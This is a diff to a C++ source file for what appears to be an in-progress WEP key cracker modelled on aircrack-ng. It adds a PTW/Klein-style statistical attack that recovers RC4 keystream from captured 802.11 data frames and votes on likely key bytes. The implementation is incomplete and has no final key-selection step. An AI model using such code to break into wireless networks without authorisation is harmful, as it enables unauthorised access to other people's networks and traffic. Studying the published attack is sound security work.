@@ -7,8 +7,8 @@
 #include "Option.h"
 #include "PtwLib.h"
 #include "H802dot11.h"
-#include "WepPara.h"
 #include "PktDbWrapper.h"
+#include "Rc4.h"
 #include "Cracker.h"
 
 #ifdef _DEBUG
@@ -73,8 +73,14 @@ size_t Cracker::CalculateClearStream(uchar_t *buf, size_t bufSize, int *weight, 
     return 0;
 }
 
-Cracker::Cracker(): wrapper(new PcapPktDbWrapper(bind(&Cracker::ReceivePacket, this, _1, _2)))
+Cracker::Cracker()
+    : wrapper(new PcapPktDbWrapper(bind(&Cracker::ReceivePacket, this, _1, _2))),
+      state(new PswState)
 {    
+    size_t i, j;
+    for (i = 0; i < WepMaxKeySize; ++i)
+        for (j = 0; j < 256; ++j)
+            state->table[i][j] = 0;
 }
 
 void Cracker::Start() const
@@ -140,7 +146,7 @@ void Cracker::ReceivePacket(shared_ptr<uchar_t> buf, size_t bufSize)
     }
 
     DataFrame& dataFrame = *dynamic_pointer_cast<DataFrame>(h802dot11);
-    prtstrm << dataFrame << endl;
+    dbgstrm << dataFrame << endl;
 
     //line 1424,  aircrack-ng.c, aircrack-ng-1.2-rc2   ???
     /* frameBody[0] frameBody[1] frameBody[2] are WEP Initialization Vector.
@@ -159,50 +165,73 @@ void Cracker::ReceivePacket(shared_ptr<uchar_t> buf, size_t bufSize)
 
     /* check the WEP key index. Data Frame, WEP Parameter */
     /* do nothing. */
-
-    if (option.DoPtw())
-    {
         uchar_t clear[512] = {0};
         int     weight[16];
 
-        /* frameBody[1] bit0 is ToDs, bit1 is FromDs, 
-            means h802dot11->GetToDsBit() == 1 && h802dot11->GetFromDsBit() == 1
-        if((frameBody[1] & 0x03) == 0x03) //30 byte header
-        {
-            body += 6;
-            dataSize -=6;
-        }
-        */
-
-        memset(weight, 0, sizeof(weight));
-		memset(clear, 0, sizeof(clear));
-
-        size_t i, clearSize; 
-        clearSize = CalculateClearStream(clear, sizeof(clear), weight, dataFrame);
-        for (i = 0; i < clearSize; i++)
-        {
-            clear[i] ^= wepIv[WepPara::GetIvKeyIndexSize() + i];
-        }
-
-        if(clearSize != 0)
-        {
-         //   int i,j;
-         //   int il, ir;
-
-         //   i = (iv[0] << 16) | (iv[1] << 8) | (iv[2]);
-	        //il = i/8;
-	        //ir = 1 << (i%8);
-
-        //    if (PTW_addsession(nullptr, frameBody, clear, weight, k))
-        //        ap_cur->nb_ivs_clean++;
-        }
-
-        //if (PTW_addsession(nullptr, frameBody, clear, weight, k))
-        //{
-        //    ap_cur->nb_ivs_vague++;
-        //}
+    /* frameBody[1] bit0 is ToDs, bit1 is FromDs, 
+        means h802dot11->GetToDsBit() == 1 && h802dot11->GetFromDsBit() == 1
+    if((frameBody[1] & 0x03) == 0x03) //30 byte header
+    {
+        body += 6;
+        dataSize -=6;
     }
-    cout << endl;
+    */
+
+    memset(weight, 0, sizeof(weight));
+	memset(clear, 0, sizeof(clear));
+
+    size_t i, clearSize; 
+    clearSize = CalculateClearStream(clear, sizeof(clear), weight, dataFrame);
+    uchar_t *snapHeader = wepIv + WepPara::GetIvKeyIndexSize();
+    for (i = 0; i < clearSize; i++)
+    {
+        /* calculate KSA of round i+3 */
+        clear[i] = clear[i] ^ snapHeader[i];
+    }
+    /* Start PSW process. */
+    uint_t ivId;
+    ivId = (wepIv[0] << 16) | (wepIv[1] << 8) | (wepIv[2]);
+    if (state->IvBits.test(ivId))
+        return;
+
+    state->IvBits.set(ivId);
+    uint8_t buffer[WepMaxKeySize];
+    GuessKeyBytes(wepIv, WepPara::GetIvSize(), clear, buffer, WepMaxKeySize);
+    for (i = 0; i < WepMaxKeySize; ++i)
+    {
+        state->table[i][buffer[i]]++;
+    }
+}
+/*
+ */
+
+/* PTW Notation:
+   S : the permutation of Rc4's state;
+   Si: RC4 internal permutation S after the i-th RC4 round. 1  i  n corresponds to the key setup algorithm, 
+       while i > n is the key stream generation algorithm;
+   X : RC4 key stream;
+*/
+void Cracker::GuessKeyBytes(uchar_t *iv, size_t ivSize, uchar_t *key, uchar_t *result, size_t resultSize)
+{
+    Rc4 rc4(iv, ivSize, 3);
+    
+    size_t i;                      /* result array index */
+    uint_t *state = rc4.GetData(); /* S, formula 26, kleins_and_ptw_attacks_on_wep.pdf */
+    uchar_t sx;                    /* value of S[idx] */
+    uchar_t idx;                   /* index of S, we will find idx by sx */
+    uchar_t j3 = rc4.GetY();       /* j3, formula 26, kleins_and_ptw_attacks_on_wep.pdf */
+    uchar_t sum = 0;
+    
+    for (i = 0; i < resultSize; i++) 
+    {
+        sx = i + ivSize - key[i + ivSize - 1];
+        /* Calculate S's index whose value is "i + 3 - X[i + 2]" */
+		for(idx = 0; sx != state[idx]; idx++) 
+        {}
+		sum = sum + state[i + ivSize];
+        idx = idx - (j3 + sum);
+		result[i] = idx;
+	}
 }
 
 CxxEndNameSpace
